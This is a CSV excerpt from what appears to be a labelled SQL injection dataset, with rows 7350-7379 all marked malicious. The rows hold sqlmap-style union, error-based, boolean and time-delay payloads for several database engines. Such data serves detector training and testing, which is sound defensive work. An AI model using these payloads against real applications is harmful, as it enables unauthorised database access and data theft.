row_index,payload_norm,label,sqli_type_hint
7350,"1"" ) as dlfq where 8410 = 8410",1,
7351,"1 ) as guru where 7615 = 7615 union all select null,null,null,null,null,null,null,null,null,null#",1,
7352,"1 ) and make_set ( 1559 = 4863,4863 )",1,
7353,-9484' or ( 7129 = 2349 ) *2349 and 'fcsa' like 'fcsa,1,
7354,"1' ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a )",1,
7355,"1"" where 5328 = 5328 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",1,
7356,"1"" ) ) ) union all select null,null,null,null,null,null,null#",1,
7357,1' ) as ihsc where 3978 = 3978,1,
7358,"-6125'|| ( select 'hwnm' where 1428 = 1428 union all select 1428,1428,1428,1428,1428,1428#",1,
7359,select ( case when ( 4660 = 4660 ) then 4660 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,1,
7360,1 rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ),1,
7361,"1' ) ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( ( 'pbtf' = 'pbtf",1,
7362,"1' ) where 7391 = 7391 or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --",1,
7363,1'+ ( select dklj where 3265 = 3265,1,
7364,"1' ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) )",1,
7365,"1' ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( 'cbwx' = 'cbwx",1,
7366,-3422%' ) or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( '%' = ',1,
7367,select pg_sleep ( 5 ) and ( ( ( 9476 = 9476,1,
7368,"1 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) -- fwzl",1,
7369,-3083 ) or 5221 = 7829,1,
7370,"1' ) ) union all select null,null,null--",1,
7371,"1"" ) as vcvw where 2445 = 2445 and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --",1,
7372,waitfor delay '0:0:5' and ( ( ( 'ozjl' like 'ozjl,1,
7373,"1%' or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and '%' = '",1,
7374,"1' ) ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( 'yzdp' = 'yzdp",1,
7375,"-3411' ) ) ) union all select 3185,3185,3185,3185,3185,3185,3185,3185--",1,
7376,"-6254"" where 8941 = 8941 or elt ( 1032 = 1032,3623 ) --",1,
7377,"1' and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,
7378,1 ) ) ) order by 1#,1,
7379,"-5027%"" ) ) or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( ""%"" = """,1,
